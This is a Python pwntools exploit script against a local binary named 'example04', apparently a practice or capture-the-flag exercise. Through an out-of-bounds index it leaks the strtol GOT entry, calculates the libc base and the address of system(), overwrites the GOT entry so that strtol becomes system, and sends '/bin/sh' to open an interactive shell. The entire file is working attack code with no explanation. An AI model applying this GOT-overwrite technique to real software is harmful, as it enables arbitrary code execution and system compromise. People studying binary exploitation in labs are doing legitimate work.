from pwn import *  # NOQA

context.log_level = 'debug'


def write(what, where):
    p.sendlineafter('>', str(where))
    p.sendlineafter('>', str(what))


def read(where):
    p.sendlineafter('>', str(where))
    return int(p.recvline())


binary = ELF('./example04')
libc = ELF('/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libc.so.6')
p = process('./example04')
gdb.attach(p)

strtol_got = binary.symbols['got.strtol']
numbers = binary.symbols['numbers']
offset = (strtol_got - numbers) / 8

write(1, 1)
strtol_leak = read(offset)

libc_base = strtol_leak - libc.symbols['strtol']
system_addr = libc_base + libc.symbols['system']

print(hex(strtol_leak))
print(hex(system_addr))

write(system_addr, offset)

p.sendline('/bin/sh')

p.interactive()
